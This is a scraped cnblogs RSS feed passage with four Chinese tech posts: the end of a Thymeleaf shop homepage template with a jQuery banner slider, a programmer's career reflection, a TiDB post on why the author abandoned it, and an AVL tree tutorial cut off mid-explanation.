    &amp;lt;!--topBar--&amp;gt;
    &amp;lt;div class=&quot;topBar&quot; th:replace=&quot;/top_bar :: .topBar&quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;!--//topBar--&amp;gt;
    &amp;lt;!--headerMain--&amp;gt;
    &amp;lt;div class=&quot;headerMain layout clearfix&quot; th:replace=&quot;/header_main :: .headerMain&quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;!--//headerMain--&amp;gt;
    &amp;lt;!--headerNav--&amp;gt;
    
    &amp;lt;div class=&quot;headerNav&quot; th:replace=&quot;/index_header_nav :: .headerNav&quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;!--//headerNav--&amp;gt;
&amp;lt;/header&amp;gt;
&amp;lt;!--//header--&amp;gt;
&amp;lt;!--container--&amp;gt;
&amp;lt;div class=&quot;container&quot;&amp;gt;
    &amp;lt;div class=&quot;layout clearfix&quot;&amp;gt;
        &amp;lt;!--banner--&amp;gt;
        &amp;lt;div class=&quot;banner&quot;&amp;gt;
            &amp;lt;div class=&quot;banner-img&quot;&amp;gt;
                &amp;lt;ul&amp;gt;
                    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot;&amp;gt;&amp;lt;img width=&quot;727&quot; height=&quot;350&quot; th:src=&quot;@{/static/images/banner_970x355.jpg}&quot; /&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
                    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot;&amp;gt;&amp;lt;img width=&quot;727&quot; height=&quot;350&quot; th:src=&quot;@{/static/images/banner_970x355.jpg}&quot; /&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
                    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot;&amp;gt;&amp;lt;img width=&quot;727&quot; height=&quot;350&quot; th:src=&quot;@{/static/images/banner_970x355.jpg}&quot; /&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
                &amp;lt;/ul&amp;gt;
            &amp;lt;/div&amp;gt;
            &amp;lt;ul class=&quot;banner-btn&quot;&amp;gt;
                &amp;lt;li class=&quot;current&quot;&amp;gt;&amp;lt;/li&amp;gt;
                &amp;lt;li&amp;gt;&amp;lt;/li&amp;gt;
                &amp;lt;li&amp;gt;&amp;lt;/li&amp;gt;
            &amp;lt;/ul&amp;gt;
        &amp;lt;/div&amp;gt;
        &amp;lt;!--//banner--&amp;gt;
        &amp;lt;!--快捷充值--&amp;gt;
        &amp;lt;div class=&quot;index-fast-recharge&quot;&amp;gt;
            &amp;lt;div class=&quot;recharge-body&quot;&amp;gt;
                &amp;lt;div class=&quot;recharge-head&quot;&amp;gt;
                    &amp;lt;h2&amp;gt;&amp;lt;em class=&quot;icon-phone&quot;&amp;gt;&amp;lt;/em&amp;gt;话费充值&amp;lt;/h2&amp;gt;
                &amp;lt;/div&amp;gt;
                &amp;lt;div class=&quot;recharge-con&quot;&amp;gt;
                    &amp;lt;div class=&quot;recharge-form&quot;&amp;gt;
                        &amp;lt;p&amp;gt;
                            &amp;lt;label class=&quot;name&quot;&amp;gt;手机号：&amp;lt;/label&amp;gt;
                            &amp;lt;input placeholder=&quot;支持电信&quot; type=&quot;text&quot; class=&quot;text-box&quot; /&amp;gt;
                        &amp;lt;/p&amp;gt;
                        &amp;lt;p&amp;gt;
                            &amp;lt;label class=&quot;name&quot;&amp;gt;充值方式：&amp;lt;/label&amp;gt;
                            &amp;lt;label&amp;gt;
                                &amp;lt;input type=&quot;radio&quot; class=&quot;rd&quot; /&amp;gt;
                                电信充值卡&amp;lt;/label&amp;gt;
                            &amp;lt;label&amp;gt;
                                &amp;lt;input type=&quot;radio&quot; class=&quot;rd&quot; /&amp;gt;
                                银行卡&amp;lt;/label&amp;gt;
                        &amp;lt;/p&amp;gt;
                        &amp;lt;div class=&quot;recharge-sub-btn&quot;&amp;gt; &amp;lt;a href=&quot;#&quot; class=&quot;btn btn-red&quot;&amp;gt;立即充值&amp;lt;/a&amp;gt; &amp;lt;/div&amp;gt;
                    &amp;lt;/div&amp;gt;
                    &amp;lt;div class=&quot;recharge-ad&quot;&amp;gt; &amp;lt;img th:src=&quot;@{/static/images/rachange_ad.jpg}&quot; /&amp;gt; &amp;lt;/div&amp;gt;
                &amp;lt;/div&amp;gt;
            &amp;lt;/div&amp;gt;
        &amp;lt;/div&amp;gt;
        &amp;lt;!--//快捷充值--&amp;gt;
        &amp;lt;div class=&quot;clearfix&quot;&amp;gt;&amp;lt;/div&amp;gt;
        &amp;lt;!--最新上架--&amp;gt;
        &amp;lt;div class=&quot;first-pannel clearfix&quot;&amp;gt;
            &amp;lt;div class=&quot;index-f clearfix&quot;&amp;gt;
                &amp;lt;h3 class=&quot;index-f-head&quot;&amp;gt; 最新上架 &amp;lt;span&amp;gt;每天都有上新，每天都有惊喜&amp;lt;/span&amp;gt; &amp;lt;/h3&amp;gt;
                &amp;lt;div class=&quot;index-f-body&quot;&amp;gt;
                    &amp;lt;div class=&quot;top-sales newProduct&quot;&amp;gt;
                        &amp;lt;ul class=&quot;top-sales-list clearfix&quot;&amp;gt;
                            &amp;lt;li class=&quot;top-sales-item newProduct&quot; th:each=&quot;item : ${items}&quot;&amp;gt;
                                &amp;lt;p class=&quot;item-img&quot;&amp;gt; &amp;lt;a th:href=&quot;@{'/portal/item/toDetail/'+${item.spuId}+'/'+${item.skuId}}&quot;&amp;gt;&amp;lt;img th:src=&quot;@{${item.imgPath}}&quot; /&amp;gt;&amp;lt;/a&amp;gt; &amp;lt;/p&amp;gt;
                                &amp;lt;p class=&quot;item-buss&quot;&amp;gt;&amp;lt;a th:href=&quot;@{'/portal/item/toDetail/'+${item.spuId}+'/'+${item.skuId}}&quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
                                &amp;lt;p class=&quot;item-name spec&quot;&amp;gt;&amp;lt;a th:href=&quot;@{'/portal/item/toDetail/'+${item.spuId}+'/'+${item.skuId}}&quot; th:text=&quot;${item.itemName}&quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
                                &amp;lt;p class=&quot;item-price spec&quot;&amp;gt;&amp;lt;em th:text=&quot;${item.mPrice}&quot;&amp;gt;&amp;lt;/em&amp;gt;元&amp;lt;/p&amp;gt;
                            &amp;lt;/li&amp;gt;
                        &amp;lt;/ul&amp;gt;
                    &amp;lt;/div&amp;gt;
                &amp;lt;/div&amp;gt;
            &amp;lt;/div&amp;gt;
        &amp;lt;/div&amp;gt;
        &amp;lt;!--最新上架//--&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;!--//container--&amp;gt;
&amp;lt;!--footer--&amp;gt;
&amp;lt;footer class=&quot;footer&quot; th:replace=&quot;footer :: .footer&quot;&amp;gt;&amp;lt;/footer&amp;gt;
&amp;lt;!--//footer--&amp;gt;

&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
    //banner
    $(document).ready(function(){
        var demo = $(&quot;.banner&quot;);
        var btn = $(&quot;.banner-btn li&quot;);
        var slide = $(&quot;.banner-img ul&quot;);
        var slideItem = slide.find(&quot;li&quot;);
        var c = 0, speed = 4000 , t;
        btn.each(function(number){
            $(this).click(function(){
                $(this).addClass(&quot;current&quot;).siblings().removeClass(&quot;current&quot;);
                slide.animate({&quot;left&quot;:-slideItem.width()*number},300);
                c = number;
            });
        });

        if(btn.size()&amp;gt;1){
            autoSlide();
        }

        function timedCount()
        {
            c = c + 1;
            if(c&amp;gt;=btn.size())c = 0;
            btn.eq(c).click();
        }

        function autoSlide(){
            t = setInterval(function(){timedCount();},speed);
        }
        //鼠标移入停止播放
        demo.mouseover(function(){
            clearInterval(t);
        });
        demo.mouseout(function(){
            autoSlide();
        });
    });
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;代码取自个人的开源项目：https://github.com/u014427391/taoshop，有需要可以参考&lt;/p&gt;
</description>
<pubDate>Sun, 10 Feb 2019 06:57:00 +0000</pubDate>
<dc:creator>javahih</dc:creator>
<og:description>简单介绍 目前在JavaEE领域有几中比较常用的模板引擎，分别是Jsp、Velocity、Freemarker、Thymeleaf，对Freemark语法不是特别熟悉，不过对于前端页面渲染效率来说，j</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/mzq123/p/10359234.html</dc:identifier>
</item>
<item>
<title>一个程序员的自白（自负盈亏） - wc的一些事一些情</title>
<link>http://www.cnblogs.com/wcd144140/p/10359167.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wcd144140/p/10359167.html</guid>
<description>&lt;p&gt;&lt;span&gt;他从来都是一个“自作主张”的人，对于别人的“标准答案”，他会坚定不移地反驳，“为什么只能这样”？像他这种性格，从小到大都在吃“语文”的亏。小学100分制，毕业时他语文得了89分，还能算“优秀”；初中120分制，中考时他得了88分，还能及格；高中150分制，高考时他只得了87分，没错，是不及格。对于阅读理解，他始终不服气的是，为什么只能这么理解而不能那样理解，得到的回复却是：标准答案没有这些“关键字”。从此，当然就没有从此了，他在IT专业的班级以每年一挂的成绩倒数前三远离了“铁饭碗”职位并勉强只能当上一名“程序员”。但幸运地是，他进入了一个没有技术组长、没有技术经理、没有技术总监更没有什么技术规范的高科技企业，因为那里根本不存在什么标准答案，而真正的答案深深地埋藏在他的内心深处。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/758472/201902/758472-20190210140304394-184453147.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;作为技术人员&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;在一个全新的没有标准答案和评分标准的环境里，他无须为谁负责，他写的每一行代码，只有一个客观的虚拟环境来验证：能否运行。在项目过程，他那蹩脚的两个月培训班技术受到了项目经理的无数次鄙视，甚至系统一度无法正式上线而不得不求助于以前经常在培训班上让我们陪他打dota的培训班老师，但远水救不了近火。因此，连续“三天三夜”的前线战斗打下了他程序员生涯的第一个里程碑，并在系统正式上线的那一刻他转过头对他的项目经理说，我是在“鄙视”中长大的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/758472/201902/758472-20190210140413514-1867307175.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;作为技术组长&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;严格来说，自从他被面试进入公司的那一刻，他就是技术组长，因为他是公司的第一个“Java程序员”，源于公司拿到了第一个需要用Java作为主要开发语言的移动互联网科研项目，并在面试官口头给出offer的那一刻，他就成为了这个公司的面试官。项目初期包括他在内一共有两个半后端开发人员（外包算半个），他们负责的范围包括架构和功能的设计、开发、测试、实施、维护和一系列的运营数据统计，这种场景算是普遍的典型小项目模式。虽然是小小的科研类项目，但对于这班菜鸟来说，系统故障是家常便饭，各种不熟悉和漏洞更是“毫无破绽”。对于一个科研类项目，其实领导关心的不是系统能否正常运行，更多是钱花了没有。当然，这些都是后知后觉，也幸好是后知后觉，如果他当初知道了这个真相，我想他就没有了那股边在公司开发边跑客户现场运维的冲劲，他花费了别人数倍的“努力”为的就是让系统的正常运行时长能更长一点。一个多小时的来回路程一天跑几趟也是常有的事，无论白日黑夜或日晒雨淋，但他毫无怨言，因为他始终认为自己写的代码自己负责。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/758472/201902/758472-20190210140511425-1897788635.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;作为技术经理&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt; “小项目不关注”也许能容忍系统88.88%的可用性，但对于一个千万级用户的系统来说，系统的高可用已经不仅仅只依赖于他的每一行代码，而是整个团队的每一行代码。他时刻让他的团队意识到他们写的每一行代码都会以每秒数万次甚至数十万次被执行的速度在奔跑。但他意识到系统能否高效和稳定地运行跟他在团队强调这些细节的次数无关，而是跟他对“整体”负责任的态度有关。他沉默和深思，静静地聆听着系统每一行代码在运行过程的各种咆哮，默默地感受着每一句代码交互所产生的情绪。聆听和感受只是第一步，他还需要去解读和理解，但他自身功力的不足让各种外在和内在的情绪纠缠不清，各种混乱的思绪一度让他无法呼吸。面对这种情况，他可以抱怨缺乏一个好团队而另寻东家，他同样可以埋怨自身能力的不足而打退堂鼓。但他并没有这么做，并且强制不让自己产生这种念头，因为他始终认为，他一直在为自己打工，而不是别人，放弃当前就是放弃自己。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/758472/201902/758472-20190210140608770-1569217956.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;作为部门经理&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt; 一个人能扛得住一个大型系统的高可用运行，但不代表他能负担数个小型系统并行运作的能力。面对一个大型系统，他可以通过下层的“去中心化”手段确保它们都被掌控在上层的”中心化“管理之中。但这数个小型系统的运行环境本身就是一个去中心化的状态，他面对的不再是一个数百、数千或数万人的客户企业，而是一个自由、开放以及隐藏着无数可能性的全球化市场。起初他眼看着自己近70人的部门时，没有压力那是骗人的，但当他意识到这种切换的本质时，他又是如此地兴奋和熟悉，兴奋源于他仿佛突破亚马逊河流落入大西洋的那一刻，熟悉是因为他一直以来都是以市场的标准在验证自己，就像一只无形的双手在背后一直推动着他。当别人还在用年薪、月薪、日薪甚至是时薪在衡量自己价值的时候，他却以“行薪”来量化他自己的能力。“行薪”就是他们部门每一行代码的价值，为了让每一行代码价值最大化，他重新思考和梳理了系统架构以及项目职能的各种分工效能问题，把别人原本3到4个月的项目周期保质保量地压缩到两周并深受市场的喜爱，因为他早早就意识到“时间就是金钱”的道理，而且这种资源重组的高效发挥同样是一种创新。面对这个无限潜能的市场，如何让“行薪”从常数增长提高到线性增长或指数增长，这个问题让他无限兴奋，因为他不会存在“我的价值得不到体现”这个问题，而是一直在思考“我能为这个市场带来什么价值”。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/758472/201902/758472-20190210140657110-1775251578.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;写在最后&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt; 曾经的他一度让“一劳永逸”的欲望所困惑，错误的价值观让他&lt;em&gt;&lt;strong&gt;一直在为了以后不用那么努力学习和工作而在当前加倍地努力学习和工作&lt;/strong&gt;&lt;/em&gt;。他这种错误观念的背后其实就是逻辑思维不严谨的缺陷，被一个不成立的虚构假象所引导，长期下去无疑是痛苦的，这就是“观念”与“现实”的冲突和矛盾。连叔曾经对他说，每个人都应该学点逻辑学，更建议他说，如果有机会，每个人都应该做点生意。我不知道他对这些建议的理解有多少，但他一直在实践和思考。去年我问他对近两年的“经济整顿”和“末位淘汰”有什么感受，他却给了我一个冷眼说：“如果我&lt;/span&gt;&lt;span&gt;还在为这些问题而浪费时间的话，我就是那个被整顿和淘汰的人”。&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 10 Feb 2019 06:11:00 +0000</pubDate>
<dc:creator>wc的一些事一些情</dc:creator>
<og:description>他从来都是一个“自作主张”的人，对于别人的“标准答案”，他会坚定不移地反驳，“为什么只能这样”？像他这种性格，从小到大都在吃“语文”的亏。小学100分制，毕业时他语文得了89分，还能算“优秀”；初中1</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wcd144140/p/10359167.html</dc:identifier>
</item>
<item>
<title>TiDB入门（四）：从入门到“跑路” - wz2cool</title>
<link>http://www.cnblogs.com/wz2cool/p/10359159.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wz2cool/p/10359159.html</guid>
<description>&lt;p&gt;前面三章基本把 TiDB 的环境弄好了，也做了一下简单测试，有兴趣的同学可以看一下：&lt;br/&gt;&lt;a href=&quot;https://wz2cool.github.io/2019/02/07/tidb1/&quot;&gt;TiDB 入门（一）：TiDB 简介&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://wz2cool.github.io/2019/02/07/tidb2/&quot;&gt;TiDB 入门（二）：虚拟机搭建 TiDB-Ansible 部署方案&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://wz2cool.github.io/2019/02/07/tidb3/&quot;&gt;TiDB 入门（三）：简单测试&lt;/a&gt;&lt;br/&gt;本来还有一些用 jmeter 压力测试的，后来测试的结果非常不好，就不想写出来了，因为自己毕竟是用虚拟机模拟的和 TiDB 官网推荐的配置差很多，如果自己写出来是有失偏颇的。&lt;/p&gt;

&lt;h2 id=&quot;穷&quot;&gt;穷&lt;/h2&gt;
&lt;p&gt;我们可以看到，TiDB 对性能要求特别高，简单看一下配置。参考：&lt;a href=&quot;https://www.pingcap.com/docs-cn/op-guide/recommendation/&quot;&gt;软硬件要求&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;开发测试环境:&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;TiDB&lt;/td&gt;
&lt;td&gt;8 核&lt;/td&gt;
&lt;td&gt;16 GB+&lt;/td&gt;
&lt;td&gt;无特殊要求&lt;/td&gt;
&lt;td&gt;千兆网卡&lt;/td&gt;
&lt;td&gt;1（可与 PD 同机器&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;PD&lt;/td&gt;
&lt;td&gt;4 核+&lt;/td&gt;
&lt;td&gt;8 GB+&lt;/td&gt;
&lt;td&gt;SAS, 200 GB+&lt;/td&gt;
&lt;td&gt;千兆网卡&lt;/td&gt;
&lt;td&gt;1（可与 TiDB 同机器&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;TiKV&lt;/td&gt;
&lt;td&gt;8 核&lt;/td&gt;
&lt;td&gt;32 GB+&lt;/td&gt;
&lt;td&gt;SSD, 200 GB+&lt;/td&gt;
&lt;td&gt;千兆网卡&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;生产环境：&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;TiDB&lt;/td&gt;
&lt;td&gt;16 核+&lt;/td&gt;
&lt;td&gt;32 GB+&lt;/td&gt;
&lt;td&gt;SAS&lt;/td&gt;
&lt;td&gt;万兆网卡（2 块最佳）&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;PD&lt;/td&gt;
&lt;td&gt;4 核+&lt;/td&gt;
&lt;td&gt;8 GB+&lt;/td&gt;
&lt;td&gt;SSD&lt;/td&gt;
&lt;td&gt;万兆网卡（2 块最佳）&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;TiKV&lt;/td&gt;
&lt;td&gt;16 核+&lt;/td&gt;
&lt;td&gt;32 GB+&lt;/td&gt;
&lt;td&gt;SSD&lt;/td&gt;
&lt;td&gt;万兆网卡（2 块最佳）&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;监控&lt;/td&gt;
&lt;td&gt;8 核+&lt;/td&gt;
&lt;td&gt;16 GB+&lt;/td&gt;
&lt;td&gt;SAS&lt;/td&gt;
&lt;td&gt;千兆网卡&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;开发环境大概就需要两台 DELL 服务器才能满足 CPU 和内存的要求。&lt;br/&gt;并且最贵的应该是 SSD，因为是需要服务器级别的 SSD 所以会非常贵。如果要高可用 raid 5 磁盘序列需要再乘以 3 倍。&lt;br/&gt;而生产环境感觉需要六台 DELL 服务器才能满足，大概是开发环境的 3 倍要求。&lt;/p&gt;
&lt;h2 id=&quot;用不到&quot;&gt;用不到&lt;/h2&gt;
&lt;p&gt;我们之前也简单测试过，以我那台虚拟机搭建的 TiDB 只有在数据量千万级别才会和 MySQL 的性能相当，&lt;br/&gt;我好好回顾了一下自己公司用的表大小，过百万的都非常少，其实 MySQL 完全够用, 现在完全没有足够的理由去说服公司去使用 TiDB。&lt;/p&gt;
&lt;p&gt;再次翻开&lt;a href=&quot;https://pingcap.com/blog-cn/how-to-use-tidb/&quot;&gt;TiDB 正确使用姿势&lt;/a&gt;, 结尾的一句话好好记住：&lt;br/&gt;&lt;em&gt;&lt;strong&gt;如果整篇文章你只想记住一句话，那就是数据条数少于 5000w 的场景下通常用不到 TiDB，TiDB 是为大规模的数据场景设计的。&lt;br/&gt;如果还想记住一句话，那就是单机 MySQL 能满足的场景也用不到 TiDB。&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;当然这次“跑路”并不是永远放弃 TiDB，等单表业务需求到了 5000w 以上的时候，我们不能用 MySQL 解决问题的时候，我相信 TiDB 仍然是值得用的，因为 MySQL 做扩展的能力没有 TiDB 好，用现在一句流行的话来说，能用钱搞定的就不是问题，性能达到瓶颈，我用机器性能去堆就可以了。&lt;/p&gt;
&lt;p&gt;当然以后还是会持续学习 TiDB 的，希望有一天能够用上。&lt;/p&gt;
</description>
<pubDate>Sun, 10 Feb 2019 06:06:00 +0000</pubDate>
<dc:creator>wz2cool</dc:creator>
<og:description>前言 前面三章基本把 TiDB 的环境弄好了，也做了一下简单测试，有兴趣的同学可以看一下： 'TiDB 入门（一）：TiDB 简介' 'TiDB 入门（二）：虚拟机搭建 TiDB Ansible 部署</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wz2cool/p/10359159.html</dc:identifier>
</item>
<item>
<title>详细理解平衡二叉树AVL与Python实现 - sfencs</title>
<link>http://www.cnblogs.com/sfencs-hcy/p/10356467.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sfencs-hcy/p/10356467.html</guid>
<description>&lt;p&gt;上一篇文章讨论的二叉搜索树，其时间复杂度最好的情况下是O(log(n))，但是最坏的情况是O(n)，什么时候是O(n)呢？&lt;/p&gt;
&lt;p&gt;像这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1469015/201902/1469015-20190208152003000-353560581.png&quot; alt=&quot;&quot; width=&quot;221&quot; height=&quot;202&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果先插入10，再插入20，再插入30，再插入40就会成上边这个样子&lt;/p&gt;
&lt;p&gt;这个就像是双向链表，我们期望它是下面这个样子：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1469015/201902/1469015-20190208152845538-1261996640.png&quot; alt=&quot;&quot; width=&quot;264&quot; height=&quot;198&quot;/&gt;&lt;/p&gt;
&lt;p&gt;所以我们希望有一种策略能够将第一个图变成第二个图，或者说使树的结构不会产生像第一种图的形式&lt;/p&gt;
&lt;p&gt;实现这种策略的一种方式是AVL树&lt;/p&gt;

&lt;p&gt;AVL树的名称是以它的发明家的名字命名的：Adel’son-Vel’skii和Landis&lt;/p&gt;
&lt;p&gt;满足高度平衡属性的二叉树就是AVL树&lt;/p&gt;
&lt;p&gt;高度平衡属性是：对于树中的每一个位置p，p的孩子的高度最多相差1&lt;/p&gt;
&lt;p&gt;很显然前言中的第一个图并不满足高度平衡属性，第二个是满足的。&lt;/p&gt;
&lt;p&gt;同时高度平衡属性也意味着一颗AVL树的子树同样是AVL树&lt;/p&gt;
&lt;p&gt;并且可以通过证明(这里就不再证了)得到AVL树的高度是O(log n)&lt;/p&gt;
&lt;p&gt;所以得出结论，AVL树可以使时间复杂度保持O(log n)&lt;/p&gt;
&lt;p&gt;接下来的问题就是怎样保持二叉树的高度平衡属性&lt;/p&gt;

&lt;p&gt;要保持高度平衡属性的原因是破坏了高度平衡属性&lt;/p&gt;
&lt;p&gt;破坏的方式有两种：添加节点与删除节点&lt;/p&gt;
&lt;p&gt;添加节点如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1469015/201902/1469015-20190208155511042-1419357845.png&quot; alt=&quot;&quot; width=&quot;253&quot; height=&quot;216&quot;/&gt;&lt;/p&gt;
&lt;p&gt;添加50的时候，就会破坏高度平衡属性&lt;/p&gt;
&lt;p&gt;删除节点如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1469015/201902/1469015-20190208155706925-1593018905.png&quot; alt=&quot;&quot; width=&quot;215&quot; height=&quot;198&quot;/&gt;&lt;/p&gt;
&lt;p&gt;删除10的时候也会破坏高度平衡属性&lt;/p&gt;
&lt;p&gt;最后，不论是添加节点还是删除节点，都会使树变成非高度平衡的状态，这种非高度平衡的状态有4种：&lt;/p&gt;
&lt;h6 id=&quot;1-ll&quot;&gt;1.LL&lt;/h6&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1469015/201902/1469015-20190208162128252-1585930689.png&quot; alt=&quot;&quot; width=&quot;295&quot; height=&quot;235&quot;/&gt;&lt;/p&gt;
&lt;p&gt;LL是left-left，可以理解为：首先它不平衡，其次根节点的左子树比右子树高，并且根节点的左子树的左子树比根节点的左子树的右子树高。（从上到下都是左边高）&lt;/p&gt;
&lt;h6 id=&quot;2-lr&quot;&gt;2.LR&lt;/h6&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1469015/201902/1469015-20190208162647696-577521505.png&quot; alt=&quot;&quot; width=&quot;288&quot; height=&quot;225&quot;/&gt;&lt;/p&gt;
&lt;p&gt;LR是left-right，可以理解为：首先它不平衡，其次根节点的左子树比右子树高，并且根节点的左子树的右子树比根节点的左子树的左子树高。（从上到下先左高后右高）&lt;/p&gt;
&lt;h6 id=&quot;3-rr&quot;&gt;3.RR&lt;/h6&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1469015/201902/1469015-20190208163030389-1577151583.png&quot; alt=&quot;&quot; width=&quot;302&quot; height=&quot;242&quot;/&gt;&lt;/p&gt;
&lt;p&gt;RR是right-right，可以理解为：首先它不平衡，其次根节点的右子树比左子树高，并且根节点的右子树的右子树比根节点的右子树的左子树高。（从上到下都是右边高）&lt;/p&gt;
&lt;h6 id=&quot;4-rl&quot;&gt;4.RL&lt;/h6&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1469015/201902/1469015-20190208163600188-657968968.png&quot; alt=&quot;&quot; width=&quot;285&quot; height=&quot;233&quot;/&gt;&lt;/p&gt;
&lt;p&gt;RL是right-left，可以理解为：首先它不平衡，其次根节点的右子树比左子树高，并且根节点的右子树的左子树比根节点的右子树的右子树高。（从上到下先右高后左高）&lt;/p&gt;
&lt;p&gt;最后，判断是哪种形式的非平衡状态，一定要从不平衡的节点位置看，并不是看4层，比如：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1469015/201902/1469015-20190208173440848-1111454316.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里只有3层节点，不平衡的节点是20，20的左子树比右子树高，10的左子树比右子树高，所以是LL。（这里的高定义为节点5的高度为1，空节点的高度为0）&lt;/p&gt;
&lt;p&gt;接下来是保持高度平衡的调整策略：&lt;/p&gt;
&lt;p&gt;同样对于4种不同的形式有4种解决方案：&lt;/p&gt;
&lt;h6 id=&quot;1-ll&quot;&gt;1.LL&lt;/h6&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1469015/201902/1469015-20190208180248518-289519368.png&quot; alt=&quot;&quot; width=&quot;662&quot; height=&quot;237&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这个变换就像是以10为中心，向右旋转，使10变成根节点，10的左子树不变，右子树变成了20，多余出的15正好挂在由于变换失去了左子树的20的左边。变换后结点从左到右的顺序依然没有变，所以15是正好挂在20的左边的。&lt;/p&gt;
&lt;h6 id=&quot;2-rr&quot;&gt;2.RR&lt;/h6&gt;
